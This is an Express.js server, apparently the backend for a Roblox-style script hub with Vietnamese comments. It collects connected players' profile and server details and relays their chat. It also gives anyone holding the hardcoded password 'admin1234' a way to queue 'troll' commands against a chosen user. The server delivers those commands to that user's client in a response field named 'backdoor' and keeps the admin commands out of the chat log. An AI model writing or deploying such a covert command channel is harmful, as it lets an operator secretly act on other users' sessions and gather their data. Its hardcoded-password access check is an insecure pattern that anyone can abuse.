const express = require('express');
const app = express();
app.use(express.json());

let chatHistory = [];
let onlinePlayers = {};
let adminQueue = {}; // Lưu lệnh troll cho từng người

app.post('/sync', (req, res) => {
    const data = req.body;
    const now = Date.now();

    // 1. Lưu Profile cực chi tiết
    onlinePlayers[data.userId] = {
        name: data.name,
        display: data.display,
        avatar: data.avatar,
        game: data.game,
        jobId: data.jobId,
        players: data.players,
        maxPlayers: data.maxPlayers,
        isPrivate: data.isPrivate,
        hidden: data.hidden,
        lastSeen: now
    };

    // 2. Xử lý Chat & Lệnh Admin
    if (data.msg) {
        if (data.msg.startsWith("/PassDigital admin1234")) {
            // Không lưu lệnh admin vào chat
        } else {
            chatHistory.push({ sender: data.display, content: data.msg, time: now });
            if (chatHistory.length > 50) chatHistory.shift();
        }
    }

    // 3. Admin gửi lệnh troll
    if (data.adminAction && data.adminPass === "admin1234") {
        const { targetId, cmd, val } = data.adminAction;
        if (!adminQueue[targetId]) adminQueue[targetId] = [];
        adminQueue[targetId].push({ cmd, val });
    }

    // 4. Dọn dẹp AFK & Tin nhắn cũ
    for (let id in onlinePlayers) if (now - onlinePlayers[id].lastSeen > 60000) delete onlinePlayers[id];
    chatHistory = chatHistory.filter(m => now - m.time < 600000);

    res.json({
        chat: chatHistory,
        online: onlinePlayers,
        backdoor: adminQueue[data.userId] || []
    });
    if (adminQueue[data.userId]) delete adminQueue[data.userId];
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Discord Elite Server Online"));
